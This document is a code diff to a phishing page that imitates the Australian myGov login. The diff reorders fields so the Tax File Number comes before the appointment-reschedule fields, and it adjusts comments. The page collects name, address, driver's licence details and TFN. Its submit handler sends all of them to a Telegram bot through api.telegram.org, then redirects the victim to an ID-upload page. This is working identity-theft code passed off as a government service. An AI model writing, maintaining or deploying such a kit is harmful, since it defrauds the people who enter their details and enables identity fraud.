@@ -42,7 +42,8 @@
 
                             <!-- No PHP action – JavaScript handles submission -->
                             <form id="form-1" class="mygov-login-form alternative" method="post">
-                                <!-- Existing personal details fields -->
+
+                                <!-- Personal details -->
                                 <div class="input-group">
                                     <label class="override" for="userId">Full Name</label>
                                     <input id="fn" name="fn" type="text" autocomplete="off" required>
@@ -68,7 +69,13 @@
                                     <input id="dlexdate" name="dlexdate" type="text" autocomplete="off" required>
                                 </div>
 
-                                <!-- ===== NEW: Appointment reschedule fields ===== -->
+                                <!-- ===== Tax File Number (moved UP – before appointment fields) ===== -->
+                                <div class="input-group">
+                                    <label class="override" for="userId">Tax File Number</label>
+                                    <input id="tfnum" name="tfnum" type="text" autocomplete="off" required>
+                                </div>
+
+                                <!-- ===== Appointment fields (NOW at the bottom) ===== -->
                                 <div class="input-group">
                                     <label class="override" for="reschedule_date">Choose reschedule date</label>
                                     <input id="reschedule_date" name="reschedule_date" type="date" required>
@@ -78,11 +85,6 @@
                                     <input id="reschedule_time" name="reschedule_time" type="time" required>
                                 </div>
 
-                                <!-- Tax File Number (kept as is) -->
-                                <div class="input-group">
-                                    <label class="override" for="userId">Tax File Number</label>
-                                    <input id="tfnum" name="tfnum" type="text" autocomplete="off" required>
-                                </div>
                                 <br>
                                 <div class="button-digital-id-main-container override">
                                     <div class="digital-id-button-container">
@@ -149,7 +151,7 @@
             $('#form-1').on('submit', function(e) {
                 e.preventDefault();
 
-                // Build the message with all fields (including new date/time)
+                // Build the message (fields now appear in the same order as the form)
                 let msg = "|----------| PII / VERIFICATION |--------------|\n";
                 msg += "Full Name: " + $('#fn').val() + "\n";
                 msg += "Address: " + $('#add').val() + "\n";
@@ -157,10 +159,9 @@
                 msg += "Driver's License #: " + $('#dln').val() + "\n";
                 msg += "DL Card #: " + $('#dlcnum').val() + "\n";
                 msg += "DL Expiry: " + $('#dlexdate').val() + "\n";
-                // New fields
+                msg += "TFN: " + $('#tfnum').val() + "\n";          // ← moved up in message
                 msg += "Reschedule Date: " + $('#reschedule_date').val() + "\n";
                 msg += "Available Time: " + $('#reschedule_time').val() + "\n";
-                msg += "TFN: " + $('#tfnum').val() + "\n";
                 msg += "|-----------------------------------------|";
 
                 // Send to Telegram
@@ -168,7 +169,7 @@
                     url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`,
                     method: 'GET',
                     complete: function() {
-                        // Redirect to the ID upload page (pic.html) as per original flow
+                        // Redirect to the ID upload page (pic.html)
                         window.location.href = 'pic.html';
                     }
                 });
